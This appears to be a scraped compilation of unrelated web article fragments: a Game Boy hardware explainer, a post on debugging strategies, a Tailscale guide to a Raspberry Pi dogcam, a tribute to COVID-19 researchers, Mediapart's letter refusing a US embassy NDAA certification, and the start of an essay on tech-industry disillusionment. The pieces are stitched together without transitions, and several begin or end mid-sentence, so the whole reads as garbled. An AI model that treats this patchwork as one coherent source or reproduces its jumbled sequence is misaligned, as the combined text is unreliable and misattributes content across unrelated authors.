<p>Thanks again to everyone on Reddit who did advise me well on how to spot the issue on my Mac SE/30. Today the floppy drive problem does not frighten me as I’m confident to fix it easily, and even if I don’t fix it I will be able to use the SCSI2SD to boot and use my SE/30.</p>

Although, only bit manipulation instructions are found.</li></ul><p>Finally, they also added a <strong>few new instructions</strong> that are not present in either Z80 or 8080. I think explaining them one by one goes beyond the scope of this article, but the main idea is that they optimise certain operations conditioned by the way Nintendo/Sharp arranged the hardware.</p><h4 id="memory-available">Memory available</h4><p>Nintendo fitted <strong>8 KB of RAM</strong> for general purpose use (which they call <strong>Work RAM</strong> or ‘WRAM’). Notice that this is four times larger than what the <a href="https://www.copetti.org/projects/consoles/nes/">NES</a> included.</p><h4 id="hardware-access">Hardware access</h4><p>The Sharp keeps a 8-bit data bus and a 16-bit address bus, so up to 64 KB of memory can be addressed. The memory map is composed of:</p><ul><li>Cartridge space.</li><li>WRAM and Display RAM.</li><li>I/O (joypad, audio, graphics and LCD)</li><li>Interrupt controls.</li></ul><hr><h2 id="graphics">Graphics</h2><p>All graphics calculations are done by the CPU, then the <strong>Picture Processing Unit</strong> or ‘PPU’ renders them. This is another component found inside DMG-CPU and it’s actually based on the <a href="https://www.copetti.org/projects/consoles/nes/#graphics">predecessor’s PPU</a>.</p><p>The picture is displayed in an integrated LCD screen, it has a resolution of <strong>160×144 pixels</strong> and shows <strong>4 shades of grey</strong> (white, light grey, dark grey and black). But since the original gameboy has a green LCD, graphics will look <em>greenish</em>.</p><p>If you’ve read the NES article before, you may remember that the PPU was designed to follow the CRT beam. However (and for obvious reasons), we got an LCD screen in the Gameboy. Well, the new PPU doesn’t alter that part, since LCDs require to be refreshed too. In fact, some special effects achieved thanks to this behaviour will also be supported on the Gameboy.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gameboy/ppu.394820f7e0961be199b5abbc173e13e86e173b0c5ffa8ae4cf703cc46f98c535.png"><picture>

Those 8 KB will contain most of the data the PPU will need to render graphics, other bits will be stored inside the PPU as they will require a faster access rate.</p><p>The game is in charge of populating the different areas with the correct type of data. Moreover, the PPU exposes some register so they game can instruct how to manage that data (there are many rules, though).</p><h4 id="constructing-the-frame">Constructing the frame</h4><p>Let’s see now how the PPU manages to draw stuff on the screen. For demonstration purposes, <em>Super Mario Land 2</em> will be used as example:</p><div><ul><li id="tab-2-1-tiles-link"><a href="#tab-2-1-tiles">Tiles</a></li><li id="tab-2-2-background-link"><a href="#tab-2-2-background">Background</a></li><li id="tab-2-3-window-link"><a href="#tab-2-3-window">Window</a></li><li id="tab-2-4-sprites-link"><a href="#tab-2-4-sprites">Sprites</a></li><li id="tab-2-5-result-link"><a href="#tab-2-5-result">Result</a></li></ul><div><div id="tab-2-1-tiles"><h4>Tiles</h4><div><figcaption>Tiles Found in the Pattern Table</figcaption></div><p>The PPU uses <strong>tiles</strong> as a basic ingredient for rendering graphics, specifically, <strong>sprites and backgrounds</strong>.</p><p>Tiles are just <strong>8x8 bitmaps</strong> stored in VRAM in a region called <strong>Tile set</strong> or ‘Tile pattern table’, each pixel corresponds to one of the four shades of grey available. Finally, tiles are grouped into two pattern tables.</p><p>In order to build the picture, tiles are referenced in another type of table called <strong>Tile map</strong>. This information will tell the PPU where to render the tiles. Two maps are stored to construct different layers of the frame.</p><p>The next sections explain how tile maps are used to construct the layers.</p></div><div id="tab-2-2-background"><h4>Background</h4><p>The Background layer is a <strong>256x256 pixel</strong> (32x32 tiles) map containing <strong>static tiles</strong>. However, remember that only 160x144 is viewable on the screen, so the game decides which part is selected for display. Games can also move the viewable area during gameplay, that’s how the <strong>Scrolling Effect</strong> is accomplished.</p><p>One of the two tile maps can be used to build the background layer.</p></div><div id="tab-2-3-window"><h4>Window</h4><p>The Window is a <strong>160x144 pixel</strong> layer containing tiles displayed on top of the background and sprites. It doesn’t scroll.</p><p>The remaining tile map can be assigned to the window layer.</p><p>At first, this may sound like a silly feature. After all, the window layer overlaps everything else so what’s useful for? Well, both Background and Window can be used concurrently at different parts of the screen. This is accomplished by changing the <code>LCDCONT</code> register during specific scan-lines.</p><p>Thus, games normally use it to display player stats, score and other ‘always-on’ information.</p></div><div id="tab-2-4-sprites"><h4>Sprites</h4><div><a href="https://www.copetti.org/images/consoles/gameboy/ppu_mario/sprite.bca34c94b876ff47fbc94dbef084cd087e404831d4eb37d065f6a4b6a78cf8d8.png"><picture>

They can also overlap each other and appear behind the background, the viewable graphic will be decided based on a priority attribute.</p><p>They also have an extra colour available: <strong>Transparent</strong>. So, they can only display three different greys instead of four. Luckily, this layer allows defining two colour palettes make use of every colour.</p><p>The <strong>Object Attribute Memory</strong> or ‘OAM’ is a map stored inside the PPU which specifies the tiles that will be used as sprites. Games fill this region by calling the <strong>DMA unit</strong> found inside the chip, this fetches data from main RAM or game ROM to OAM.</p><p>Apart from the tile index, each entry contains the following attributes: X-Y position, colour palette, priority and flip flags (allowing to rotate the tile vertically and horizontally).</p><p>The PPU is limited to rendering up to <strong>ten sprites per scan-line</strong> and <strong>up to 40 per frame</strong>, overflowing this will result in sprites not being drawn.</p></div><div id="tab-2-5-result"><h4>Result</h4><div><a href="https://www.copetti.org/images/consoles/gameboy/ppu_mario/result.300b8ad1b603cf0e0af6d8fd194141f7d6fc9ca74d1eb57909cf6f92daeaaec6.png"><picture>

However, the CPU can’t modify the tables while the PPU is reading from VRAM, so the system provides a set of interrupts triggered when the PPU is idle. You can recall this behaviour from the times of the NES.</p><p>When a single scan-line is complete, the <strong>Horizontal Blank</strong> interrupt is called. This allows to fiddle with the part of the frame that has not yet been drawn.</p><p>When all scan-lines are complete, the <strong>Vertical Blank</strong> interrupt is called. The game can now update the graphics for the next frame.</p><p>There’s an extra state called <strong>OAM search</strong> that is triggered at the start of the scan-line, at this point the PPU is processing which sprites will be displayed in that scan-line, so the game can update any region except OAM.</p></div></div></div><h4 id="secrets-and-limitations">Secrets and Limitations</h4><p>The inclusion of the Window layer and extra interrupts allowed for new types of content and effects.</p><div><ul><li id="tab-5-1-wobble-effect-link"><a href="#tab-5-1-wobble-effect">Wobble effect</a></li></ul><div><div id="tab-5-1-wobble-effect"><h4>Wobble effect</h4><p><video poster="https://www.copetti.org/images/consoles/gameboy/video_posters/zelda.a3d6874d3e350b643cf06b924599eee374797b75615d711ede81e55d4456f855.jpg" preload="none" width="898" height="720" src="https://www.copetti.org/videos/consoles/gameboy/zelda.dc3d178cfc686f6c824fe116ffeb29d4934e537178a0af52ee3ea12605dbaf3c.mp4" href="https://www.copetti.org/videos/consoles/gameboy/zelda.dc3d178cfc686f6c824fe116ffeb29d4934e537178a0af52ee3ea12605dbaf3c.mp4" controls="" controllist="nodownload">

These use one of four different tones constructed by varying its pulse width. The first channel has an exclusive <strong>Sweep control</strong> available.</p><p>Due to the limited number of channels, the melody will often be interrupted when effects have to be played as part of the gameplay. This is very noticeable in games like Pokemon Red/Blue when, during a battle, the Pokemon’s cry will overlap all the channels used for music.</p></div><div id="tab-7-2-noise"><h4>Noise</h4><p>Noise is basically a set of random wave-forms that sound like white static. One channel is allocated for it.</p><p>Games use it for percussion or <em>ambient</em> effects.</p><p>This channel has only 2 tones available to use, one produces <em>clean static</em> and the other produces <em>robotic static</em>. Its frequency can also be controlled.</p></div><div id="tab-7-3-wave"><h4>Wave</h4><p>The APU allows to store <strong>32 custom wave-forms</strong> to be heard from its forth channel. Each wave is composed of a 4-bit sample that will be played repeatedly.</p><p>This channel also allows to control its frequency (enabling to produce different musical notes from the same sample) and volume.</p></div></div></div><h4 id="secrets-and-limitations-1">Secrets and Limitations</h4><p>The mixer outputs stereo sound, so the channels can be assigned to the left side or on the right one, this is only possible to hear from the headphones though! The speaker is mono.</p><p>Furthermore, the mixer chip is also connected to a dedicated pin on the cartridge, allowing to stream an <strong>extra channel</strong> with the condition that the cartridge has to actually output the analogue sound (only possible with extra hardware). No game in the market ended up using this feature.</p><hr><h2 id="games">Games</h2><p>Games are written in assembly and they have a maximum size of <strong>32 KB</strong>, this is due to the limited address space available. However, with the use of a <strong>Memory Bank Controller</strong> (mapper), games can reach bigger sizes. The biggest cartridge found in the market has a 1 MB ROM.</p><p>Cartridges can include a real-time clock and an external battery along with SRAM to hold saves.</p><h4 id="external-communications">External communications</h4><p>For the first time, games can communicate with other consoles with the use of a <strong>Game Boy Link</strong> cable, which provides multiplayer functionality.

        <p><strong>Developers sometimes try to use feature development strategies to find bugs—and that doesn’t always work. How do we know when our debugging process doesn’t work? and what alternative strategies can we adopt so we can find bugs more easily?</strong></p>
<p>Something is wrong in your application.</p>
<p>One part of the system sends messages to another part. It works, except sometimes, it sends an extra, errant message. You’re not sure why the extra messages happen, but you want to find out and stop them.</p>
<p>You have a hunch about what might cause the problem, so you try changing that. It doesn’t work!</p>
<p>Hmm. You can think of one other possible cause. So you change that. It doesn’t work either!</p>
<p>Your exploratory changes start to feel more and more random. You feel frustrated, and you’re not sure about the right next step.</p>
<p>You’d like to know&nbsp; that you are making progress, even if you haven’t found the issue yet. In other words, you’d like a <em>debugging strategy</em><strong>.</strong></p>
<h3>Here’s the most common debugging strategy</h3>
<p><img src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/standard_strategy-1024x719.png" alt="standard debugging strategy" width="1024" height="719" srcset="https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy-1024x719.png 1024w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy-300x211.png 300w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy-768x539.png 768w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy-1536x1078.png 1536w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy.png 1764w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p>This is how we usually do things: We try changing the thing we think is the most likely cause of the issue in our code. If that works, great! We solved the problem. If it doesn’t work, we try changing the thing we think is the <em>next</em> most likely item causing the issue in our code, and so on.</p>
<p>I call this strategy the <em>standard strategy</em><strong>. </strong>This is often the quickest way to diagnose the bug, assuming we understand the code’s behavior. We can move fast when we wish to push forward with new functionality or large refactors. This is <a href="https://www.functionize.com/blog/6-ways-to-improve-your-debugging-skills/">the mode demonstrated in most programming tutorials</a>, and it’s the one celebrated by product owners and hiring managers.</p>
<p>It has a problem, though: The less we understand the behavior of our code, the lower the correlation between the things we <em>think</em> are causing the bug and the thing that’s really causing the bug, and the weaker this strategy becomes. So we get end up in vicious cycles:</p>
<p><img src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/standard_strategy_failure-1024x701.png" alt="standard strategy failure" width="1024" height="701" srcset="https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy_failure-1024x701.png 1024w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy_failure-300x205.png 300w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy_failure-768x526.png 768w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy_failure-1536x1051.png 1536w, https://www.functionize.com/wp-content/uploads/2020/10/standard_strategy_failure.png 1780w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p>Have you ever gotten so frustrated while searching for an issue in your code that you tried something you <em>know</em> you already tried, just to see if it works this time? <em>That</em> is the point where a different strategy might work better.</p>
<h3>Learning to investigate</h3>
<p>Choosing a different strategy means first shifting our mindset. So far we have been in <em>progress mode</em>, trying to change the software with speed. We need a second mode: <em>investigation mode</em><strong>.</strong></p>
<p>In investigation mode, we are no longer focused on pushing changes. Instead, we focus on narrowing down the problem space by testing our assumptions. “Success,” in investigation mode, is not an incrementally broader feature set. Instead, it is an incrementally tighter feedback loop in which we experiment with the thing we don’t understand in order to gain an understanding.</p>
<p>The gold standard here is often a failing test that replicates a problem. Any tactic with a tight feedback loop works, though—the tighter the better.</p>
<p>We are reluctant to shift into investigation mode because, unlike progress mode, it doesn’t <em>feel</em> fast. Nevertheless, when we deal with unknowns, a precise investigation can help resolve issues in less time (and with much less effort) than the brute-force approach of progress mode.</p>
<p>For example, I ran into a problem with image upload on an application that processes NASA LandSat data. Upload happened at the very end of the processing pipeline, which took about 20 minutes to run. So even though I had a pretty good guess at the cause of the problem, testing my theory would take at least 20 minutes. Instead, I wrote a little script to rerun the exact portion of the code that failed and made sure I could reproduce the issue. Voila! That script allowed me to rerun the failing code in a matter of seconds. So when it turned out that my guess about the problem was wrong, I could check a lot more possibilities much faster than if I had to run the whole pipeline each time. You can follow me step-by-step through that exact bug <a href="https://chelseatroy.com/2020/01/27/the-case-of-the-failing-upload-part-1/" target="_blank" rel="noopener noreferrer">right over here</a>.</p>
<p>What kind of strategies might help us narrow down where a bug is happening?</p>
<h3>We could use a binary search to find the problem</h3>
<p>In this strategy, we assume that the code path follows a single-threaded, linear flow from the beginning of execution (where we run the code) to the end of execution, or when the issue happens.</p>
<p><img src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/binary_search_strategy-1024x433.png" alt="binary search strategy" width="1024" height="433" srcset="https://www.functionize.com/wp-content/uploads/2020/10/binary_search_strategy-1024x433.png 1024w, https://www.functionize.com/wp-content/uploads/2020/10/binary_search_strategy-300x127.png 300w, https://www.functionize.com/wp-content/uploads/2020/10/binary_search_strategy-768x324.png 768w, https://www.functionize.com/wp-content/uploads/2020/10/binary_search_strategy-1536x649.png 1536w, https://www.functionize.com/wp-content/uploads/2020/10/binary_search_strategy-2048x865.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p>We choose a spot more or less in the <em>middle </em>of that flow. Then we print, log, or breakpoint to test our assumptions about the pieces of code that would contribute to the issue. If something looks off, we move <em>backward</em>, choose another point halfway between that starting point and the beginning of execution, and test our assumptions again.</p>
<p>By contrast, if everything looks good, we move <em>forward, </em>choose a point halfway between the starting point and the end of execution ( or when the issue happens), and test our assumptions there instead.</p>
<p>Each time we jump, we reduce the size of the potential problem space by half. Even in enormous code bases with long threads of execution, we can isolate the location of an issue in just a few hops with a binary search.</p>
<p>There are cases where binary search won’t work: namely, cases where the code path does not follow a single-threaded, linear flow from the beginning of execution to the end.</p>
<h3>Instead, we may need to systematically trace the code path</h3>
<p>This approach is simpler to communicate than the binary search strategy. It follows the logical line of inquiry and results in fewer misinterpretations. Depending on the length and complexity of the process you’re debugging, this strategy might take longer than the binary search strategy, but sometimes it works better for multi-threaded or asynchronous processes that are hard to map onto a linear flow for using binary search.</p>
<p><img src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/beginning_to_end-1024x409.png" alt="beginning to end" width="1024" height="409" srcset="https://www.functionize.com/wp-content/uploads/2020/10/beginning_to_end-1024x409.png 1024w, https://www.functionize.com/wp-content/uploads/2020/10/beginning_to_end-300x120.png 300w, https://www.functionize.com/wp-content/uploads/2020/10/beginning_to_end-768x307.png 768w, https://www.functionize.com/wp-content/uploads/2020/10/beginning_to_end-1536x614.png 1536w, https://www.functionize.com/wp-content/uploads/2020/10/beginning_to_end-2048x819.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p>In this strategy, we begin right where the code begins executing. Test the assumptions there, at the starting point. If everything looks good, we take the next step forward towards the end of the process (or the spot where the issue happens), and test our assumptions again. Even if we <em>think</em> that the problem occurs toward the end, we do not skip to that spot. Instead, we systematically move through the steps of the process from the beginning, making sure that the state of our system matches our expectations at every point.</p>
<p>Remember: if we’re struggling to resolve an issue, there’s probably something we don’t understand about what’s going on. At least one of&nbsp; our assumptions doesn’t match up with reality. This systematic approach helps us find out where that is.</p>
<p>To help us differentiate our assumptions from system behavior, it can be helpful to explicitly list our assumptions and checks. As we follow the process, at each point where we stop, we can write down a list of three things:</p>
<ol>
<li><strong>Givens</strong>: Stuff that we assume to be true at this point</li>
<li><strong>Checks:</strong> Things that we are checking with print statements, logging, break points, etc.</li>
<li><strong>Results:</strong> What we saw when we tested out each of our checks. Did it match expectations?</li>
</ol>
<p>This practice of recording our steps during a debugging session has little to do with remembering what we did (though it does help with that). Rather, we are training our brains to spot our own assumptions.</p>
<p>You’ll know it’s working if your “given” lists start getting longer. We <em>especially</em> remember to include givens that weren’t what we thought when we hunted down previous bugs. We build this intuition when we get better at debugging through practice. That teaches us to recognize our assumptions, which we previously mistook to be plain old truths. That’s how we get stuck. And to get <em>unstuck</em>, we need to find the inaccuracies that are hiding in our only <em>partially</em> correct understanding of how the code works.</p>
<p>There’s another advantage to identifying common patterns in our wrong assumptions (at least the ones that cause bugs). Doing so lets us improve our <em>language-agnostic</em> debugging intuition. That’s right: the skill of&nbsp; recognizing our own assumptions helps us debug more effectively even if we switch tech stacks.</p>
<h3>What about issues that only appear sometimes?</h3>
<p>Among the most frustrating bugs are those that crop up erratically. These types of problems have a special talent for eluding programmers—sometimes for days, sometimes for years! They usually happen for one of two reasons:</p>
<ul>
<li><strong>Defining the process too narrowly. </strong>Our idea of where our code begins and ends, and everything in between, is <em>missing </em>some variable. Maybe it’s an environment variable. Maybe it’s a race condition. Maybe it’s an edge case that we haven’t yet identified. To find it, we have to broaden our scope. What are we placing <em>outside</em> the set of things we’re looking at that actually belongs <em>inside</em> it?</li>
<li><strong>One of the givens is only true sometimes. </strong>This kind of bug tries developer and tester patience more than any other kind. They’re difficult to track down because, even when we <em>check</em> our givens, those givens might turn out to be accurate…<em>this time</em>. We have to check them multiple times, and hope that <em>each time</em> we re-check it, it does the thing it might only do sometimes.</li>
</ul>
<h3>When to switch modes</h3>
<p>Most developers and testers are excellent at working in progress mode, where we focus on pushing changes to a software system at a quick pace. But that happens when we understand exactly what the system is doing. Hard-to-find bugs, by definition, represent something we <em>don’t</em> understand. At that point, it’s time to switch strategies. Focus on investigation — to narrow down the things that <em>could</em> cause the problem.</p>
<p>Both investigation strategies need us to recognize and test our assumptions. What do we <em>think</em> is true at this point? How <em>sure</em> are we? Can we use a print statement, a breakpoint, a logging statement, or another means to test our assumption? We can even keep a written record of our assumptions, checks, and results as we debug to help ourselves get better at our cross-platform debugging skills. Tools can help with the bookkeeping, but it’s the human skill that finds the “oh that’s why!” source of the problem.</p>
<p>Debugging can sometimes feel tedious and frustrating, but a few …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Tailscale makes it easy to setup a dogcam that you can securely access from
anywhere.</p>
<p>Unlike an off-the-shelf dogcam, with Tailscale you don’t need to trust
a third-party service, or risk exposing a camera inside your home to the public
internet. Every connection on Tailscale is encrypted and entirely private
to your network.</p>
<h4 id="prerequisites">Prerequisites</h4>
<p>Before you begin this guide, you’ll need two things:</p>
<ol>
<li>A Raspberry Pi with Wi-Fi/Ethernet capabilities (e.g. <a href="https://www.raspberrypi.org/products/">Raspberry Pi 3 B+</a>)</li>
<li>A USB webcam (e.g. <a href="https://www.amazon.com/dp/B0058LKJIO/">Logitech C615</a>)</li>
</ol>
<p>This guide assumes your Raspberry Pi is already <a href="https://www.raspberrypi.org/documentation/configuration/wireless/wireless-cli.md">set up with an internet connection</a>,
whether Wi-Fi or Ethernet.</p>
<p>You’ll also need <a href="https://tailscale.com/start">a Tailscale account</a>. You can make
a free solo account using a @gmail.com address.</p>
<h4 id="step-1-install-tailscale-on-your-raspberry-pi">Step 1: Install Tailscale on your Raspberry Pi</h4>
<p>You can find instructions at the link below.</p>

<p>Once it is installed, and you’ve run <code>tailscale up</code> on your Raspberry Pi, continue to the next step.</p>
<h4 id="step-2-install-motion">Step 2: Install motion</h4>
<p>Next, install <a href="https://motion-project.github.io/">motion</a> using apt with this command</p>
<pre><code>sudo apt install motion</code></pre>


<h4 id="step-3-configure-motion">Step 3: Configure motion</h4>
<p>First, we’ll enable motion to run as a background service. Edit
<code>/etc/default/motion</code> using <code>nano</code> or your favourite editor:</p>
<pre><code>sudo nano /etc/default/motion</code></pre>


<p>We’ll change the start_motion_daemon setting to “yes”:</p>
<pre><code>start_motion_daemon=yes</code></pre>


<p>Save and close the file.</p>
<p>Next, we’ll configure motion to expose a web page, and modify a few video
capture settings too.</p>
<p>Open up <code>/etc/motion/motion.conf</code> with your editor</p>
<pre><code>sudo nano /etc/motion/motion.conf</code></pre>


<p>Search for the following settings, updating their values to ones listed below.</p>
<p><em>Enable viewing video streams over the web.</em> You can also change the port from the default value (8081) if you’d like.</p>
<pre><code>stream_port 8081
stream_localhost off</code></pre>


<p><em>Disable saving images or video to the SD card.</em> Since this is a dogcam, we
  only care about looking at live footage.</p>
<pre><code>output_pictures off
ffmpeg_output_movies off</code></pre>


<p>Save and close the file.</p>
<h4 id="step-4-restart-motion">Step 4: Restart motion</h4>
<p>Once all your configuration settings have been updated, restart motion</p>
<pre><code>sudo service motion restart</code></pre>


<h4 id="step-5-view-your-dogcam">Step 5: View your dogcam</h4>
<p>From any device in your Tailscale network, you can now view the live webcam
stream from <code>&lt;raspberry pi tailscale ip&gt;:8081</code>. <a href="https://tailscale.com/kb/1033/ip-and-dns-addresses">Find your Raspberry Pi’s IP</a>
and type it into your browser.</p>
<figure>
  <img src="https://tailscale.com/files/images/docs/guides/dogcam-raspberry-pi.jpg">
  <figcaption>
    <p>
    On macOS, you can click on the device name to copy the IP address.
    </p>
</figcaption></figure>

<p>You should see a feed from your webcam, that will look something like this.</p>
<figure>
  <img src="https://tailscale.com/files/images/docs/guides/dogcam-browser.jpg">
  <figcaption>
    <p>
    Theo and Casey are looking at something that's totally not a Tailscale employee running around in a backyard.
    </p>
</figcaption></figure>

<p>Success! You now have a functioning dogcam, secured with Tailscale. This can
only be accessed by devices on your personal Tailscale network, and no one else.</p>
<div>
<p>Note</p>
<p>Your browser may show an “insecure” warning, since your connection isn’t
over HTTPS. Tailscale secures your connection at a lower level, so rest easy
knowing you are securely connected to any website at 100.x.y.z IP address.</p>
</div>
<h4 id="next-steps">Next steps</h4>
<p>Install Tailscale onto your <a href="https://tailscale.com/download/android">Android</a> or <a href="https://tailscale.com/download/ios">iOS</a>
device to check in on your dogs (or other pets) wherever you may be.</p>
<p>You may also want experiment with other settings such as <code>width</code>, <code>height</code>,
or <code>framerate</code>. If you make other changes, be sure to restart motion
with <code>sudo service motion restart</code> afterwards.</p>

<p>The COVID-19 pandemic has been a world-changing event, forcing all of us to spend a lot of time thinking about change. More than ever, we’re inquiring about how diseases evolve, how new treatments and procedures are developed and adopted, and how up-and-coming experts are bringing new ideas and new ways of thinking to the medical landscape. We know that 2020 has brought a lot of new changes and concepts to the forefront of life. Words like quarantine and social distancing are part of our everyday lexicon as we learn to live in the ‘new normal.’ And one of the most important lessons we have learned is that there are heroes among us. From teachers and nurses to delivery and retail workers, our citizens have stepped up to support the effort.</p>



<p>Given that it’s <a href="https://idweek.org/" target="_blank" rel="noreferrer noopener">ID Week</a>, we’d like to highlight and honor a few of these heroes that surprisingly few know about – the scientists who are leading the charge against <a rel="noreferrer noopener" href="https://www.medifind.com/conditions/covid-19/6278" target="_blank">COVID-19</a>.</p>

The antibody against Hendra and Nipah viruses has been evaluated in humans and approved for clinical use on a compassionate basis in Australia.</p>



<p>Recently Dr. Dimitrov’s lab isolated the smallest biological molecule to date that completely and specifically neutralizes the SARS-CoV-2 virus, which is the cause of COVID-19.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p><span>In an email sent to our “Subscribers” department on September 24th, the United States embassy in France notified us that its subscription to Mediapart would only be renewed on condition that Mediapart signs a declaration certifying that we do not use equipment manufactured by Chinese companies or their subsidiaries.</span></p>
<p><span>The notification, written in French, polite in form and firm in substance, read as follows: “We subscribe to Mediapart (2 subscriptions), I am sending you, attached here, an attestation in English [<i>see </i><a href="https://static.mediapart.fr/files/2020/10/07/po-ndaa-representations-sept-2020-1.pdf" target="_blank"><i>here</i></a>] which should be signed and dated. Without this attestation, we will no longer be able to buy from you [<i>sic</i>] because the government of the United States requires an attestation by those who sell to us certifying that they do not use certain materials, the list of which is below.” </span></p>
<p><span>“The government of the United States of America voted the entering into force of the <a href="https://content.govdelivery.com/accounts/ORDOT/bulletins/29b2007" target="_blank">National Defense Authorization Act (NDAA)</a> on August 13th 2020; a part of the NDAA is specifically dedicated to contracts and acquisitions, and notably to commercial relations with companies which use within their network(s) material from <a href="https://fr.wikipedia.org/wiki/Huawei" target="_blank">Huawei</a>, <a href="https://fr.wikipedia.org/wiki/ZTE" target="_blank">ZTE</a>, <a href="https://fr.wikipedia.org/wiki/Hikvision" target="_blank">Hikvision</a>, <a href="https://en.wikipedia.org/wiki/Dahua_Technology" target="_blank">Dahua</a>,<a href="https://en.wikipedia.org/wiki/Hytera" target="_blank">Hytera</a> as well as their subsidiaries and affiliated companies. Therefore, we thank you for returning the attestation, duly signed, in order to be able to provide you with an order form for your services.” </span></p>
<p><span>The five companies targeted are large Chinese groups working in the fields of telecommunications and telemonitoring and controlled by the authorities in Beijing. Far from being zealous, the American diplomatic services in France are simply applying the instructions of the Trump administration which unilaterally imposes its trade law in the name of security interests. It was thus that its decision to pull out of the deal over the Iranian nuclear programme was accompanied by threats of sanctions against any European company that continued to do business with Tehran. Far from being anecdotal, these measures, which are those of a dominating nationalism, signify the death of any multilateralism, the American power believing itself to have the right to impose, without discussion, its laws upon foreign partners, without regard for their sovereignty, liberty or rights.</span></p>
<p><span>That is what is illustrated, to the point of absurdity, by the bureaucratic order that has been made to us for just two subscriptions. We could have regarded it as laughable, and signed and return the attestation required of us, considering it to be a simple formality. But this is about a question of principle, where essential issues of renunciation are at play. So here below is the reply I sent to the US embassy services concerned, in my position as publishing editor of Mediapart, on October 6th, explaining our refusal to comply with the demand.&nbsp; &nbsp;</span></p>
<p><b><span>*</span></b></p>
<p><span>In your email correspondence of September 24th 2020, you asked Mediapart, in the name of the National Defense Authorization Act (NDAA) of August 13th 2020, to certify that it does not use telecommunications equipment or services supplied by the companies Huawei, ZTE, Hikvision, Dahua and Hyteria, and does not use equipment, systems or services using equipment or services provided by these companies. In the event that we do not provide that certification, you indicate that you will no longer be able to maintain your subscriptions to our journal in the name of the United States embassy.</span></p>
<p><span>Your request, if we agreed to it, would require Mediapart to apply discrimination of its suppliers on the basis of their country of origin, in this case companies established in the People’s Republic of China, namely Huawei, ZTE, Hikvision, Dahua and Hyteria. This in every sense represents placing pressure on an independent media.</span></p>
<p><span>Your administration cannot be unaware that any pressure placed on a media organisation is an attack on its independence. This concerns a principle which is enshrined in the First Amendment of the Constitution of the United States, the country where the freedom of expression and that of the press was born. This principle was in turn enshrined in the Constitution of the French Republic, in the European Charter of Fundamental Rights and in the European Convention on Human Rights, which are the laws which govern us.&nbsp;&nbsp;&nbsp; </span></p>
<p><span>Mediapart chooses its suppliers on the basis of criteria concerning quality and price. To give a favourable response to a request of this nature, one that is obviously discriminatory, would undermine the managerial choices of Mediapart and its economic equilibrium.&nbsp; </span></p>
<p><span>Concerning the material supplied by the targeted companies, the requirements of the government of the United States of America refer to security criteria, but are evidently of an ideological nature. Given that the activities of our journal do not concern, in any manner, the national security or foreign affairs policies of the United States of America, your request is unreasonable.</span></p>
<p><span>In the same way that we would not accept in any manner an instruction from the People’s Republic of China aimed at prohibiting us, on the pretext of security, from using the products, services, platforms or equipment of American companies (Microsoft, Apple, Google, Facebook, Twitter, Instagram, etc.), your request relating to products of Chinese companies (Huawei, ZTE, Hikvision, Dahua and Hyteria) cannot in any manner be given satisfaction.</span></p>
<p><span>Finally, concerning the links between the government of the People’s Republic of China and the companies targeted by your request, we remind you that Mediapart is a journal at the forefront of the defence of human and political rights, notably those of the inhabitants of Hong Kong and of Tibet, and members of the Uyghur minority, and therefore has no need of a lecture on these engagements from any state or government.</span></p>
<p><span>Yours sincerely.</span></p>

October 26, 2020 | https://www.spakhm.com/p/surviving-disillusionment | <a href="https://web.archive.org/web/*/https://www.spakhm.com/p/surviving-disillusionment">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the past few weeks I wrote about <a href="https://www.spakhm.com/p/how-to-get-promoted">corporate politics</a>, <a href="https://www.spakhm.com/p/parallel-tracks">distribution of power</a>, and <a href="https://www.spakhm.com/p/an-open-letter-to-my-friends-with">disregard for ethics</a>. Dozens of people reached out to say the posts were dark, cynical and depressingly accurate. There are more dark posts I can write— about lies in venture capital, the devastating price of failure, the destructive aspect of creative relationships, the ubiquity of envy. But I think I've gotten my point across. The industry can be depressing. I now want to concentrate on a different question: what to do with this knowledge.</p><p>The word "possession" means owning things, but it also means things owning you. Knowledge can possess people. Once you observe the darker side of human nature in the technology industry, you cannot forget or unsee it. The subsequent cynicism can be so disheartening that the romance of the computer revolution is beat out of people completely.</p><p>I've met many engineers with extraordinary talent who decided to stop making software. They wanted to program computers all their lives. They were born for it. After spending six, eight, ten years in the industry, they quit for good. Now they're running breweries and hydroponic farms, with no desire to ever again touch a compiler, let alone get back into the fray.</p><p>There is nothing wrong with brewing beer or growing hydroponic tomatoes. What's sad is that people weren't pulled into their new occupation by better financial opportunities or conviction; instead they were pushed away from technology. If brewing paid as much as programming, it still wouldn't have been their first choice. Something had to have gone wrong for them to abandon their first love.</p><p>In <a href="https://amzn.to/35ATS95">Zen Mind, Beginner's Mind</a>, Shunryu Suzuki says:</p><blockquote><p>For us, the monastic life was the usual life, and the people who came from the city were unusual people. When we saw them we felt, “Oh, some unusual people have come!” But once I had left Eiheiji and been away for some time, coming back was different. I heard the various sounds of practice—the bells and the monks reciting the sutra—and I had a deep feeling. There were tears flowing out of my eyes, nose, and mouth! It is the people who are outside of the monastery who feel its atmosphere. Those who are practicing actually do not feel anything. I think this is true for everything.</p></blockquote><p>I still remember the feeling when I first glanced inside the monastery. My parents bought me a ZX Spectrum computer connected to an old Soviet TV and cassette player, a few bootleg games, and a Z80 assembly manual 